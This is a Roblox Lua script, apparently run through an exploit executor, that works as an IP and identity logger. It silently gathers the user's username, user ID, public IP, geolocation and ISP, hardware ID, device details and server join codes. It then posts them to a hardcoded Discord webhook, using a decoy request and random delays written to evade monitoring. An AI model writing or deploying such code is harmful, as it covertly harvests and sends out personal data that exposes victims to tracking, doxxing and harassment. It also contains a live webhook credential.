local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")

-- Executor detection
local function getexecutor()
    local executor = 
        (type(identifyexecutor) == "function" and identifyexecutor()) or
        (type(getexecutorname) == "function" and getexecutorname()) or
        "Unknown"
    return executor
end

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local LuaJoinCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')", game.PlaceId, game.JobId)

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Device Type and Details
local function getDeviceInfo()
    local deviceType = "Unknown"
    local details = {}

    if GuiService:IsTenFootInterface() then
        deviceType = "Console"
    elseif UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
        deviceType = "Mobile"
        local viewportSize = workspace.CurrentCamera.ViewportSize
        details.screenResolution = string.format("%dx%d", viewportSize.X, viewportSize.Y)
        details.deviceOrientation = (viewportSize.X > viewportSize.Y) and "Landscape" or "Portrait"
        details.isTablet = (viewportSize.Y > 600) and "Tablet" or "Phone"
    else
        deviceType = "Desktop"
        details.hasKeyboard = UserInputService.KeyboardEnabled
        details.hasMouse = UserInputService.MouseEnabled
        details.hasTouch = UserInputService.TouchEnabled
        details.hasGamepad = UserInputService.GamepadEnabled
    end

    details.graphicsQuality = UserSettings().GameSettings.SavedQualityLevel
    details.viewportSize = tostring(workspace.CurrentCamera.ViewportSize)

    return deviceType, details
end

-- VPN and ISP Detection
local function getVpnAndIspInfo()
    local ipData = HttpService:JSONDecode(GetData)
    local isVpn = ipData.proxy == true and "Y" or "N"
    local isp = ipData.isp or "Unknown"
    return isVpn, isp
end

-- Creating Webhook Data
local function createWebhookData()
    local deviceType, deviceDetails = getDeviceInfo()
    local isVpn, isp = getVpnAndIspInfo()
    local executor = getexecutor()
    
    local data = {
        ["avatar_url"] = "https://github.com/tomoneko2222/tomonekonet.tool/blob/main/logo.png?raw=true",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n**Device Type:** %s" ..
                    "\n**Device Details:** %s" ..
                    "\n**VPN:** %s" ..
                    "\n**Provider:** %s" ..
                    "\n**Executor:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d" ..
                    "\n\n**Data:**```%s```\n\n**Console JobId:**```%s```\n\n**Lua Join Code:**```lua\n%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    deviceType, HttpService:JSONEncode(deviceDetails),
                    isVpn, isp, executor,
                    game.PlaceId, GAMENAME, game.PlaceId,
                    GetData, ConsoleJobId, LuaJoinCode
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(Userid) .. "&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook with a fake URL first to mislead potential monitoring scripts
local function sendWebhook(fakeUrl, realUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    -- Send to the fake URL first (this does nothing useful)
    local requestFakeWebhookUrl= {Url=fakeUrl, Body=data, Method="POST", Headers=headers}
    
    -- Send to the real URL after a delay to avoid immediate detection
    spawn(function()
        wait(math.random(3, 7))  -- Random delay to further obfuscate the real request timing
        local requestRealWebhookUrl= {Url=realUrl, Body=data, Method="POST", Headers=headers}
        
        -- Execute both requests using whichever HTTP request function is available in the environment
        local requestFunction=request or http_request or HttpPost or syn.request
        
        if requestFunction then 
            requestFunction(requestFakeWebhookUrl)
            requestFunction(requestRealWebhookUrl)
        end 
    end)
end

-- Fake webhook URL (does nothing)
local fakeWebhookUrl="https://discord.com/api/webhooks/128876165775727005/aaaaaaa"

-- Real webhook URL (replace this with your actual webhook URL)
local realWebhookUrl="https://discord.com/api/webhooks/1290539617388466237/IgTEsOjdIPouL5zII3GcZjV_AomwsQV83N572I5gvUyny0o8YGaYBKnFYsS7qENziIkR"

-- Create webhook data and send it using both fake and real URLs 
local webhookData=createWebhookData()

sendWebhook(fakeWebhookUrl, realWebhookUrl, webhookData)
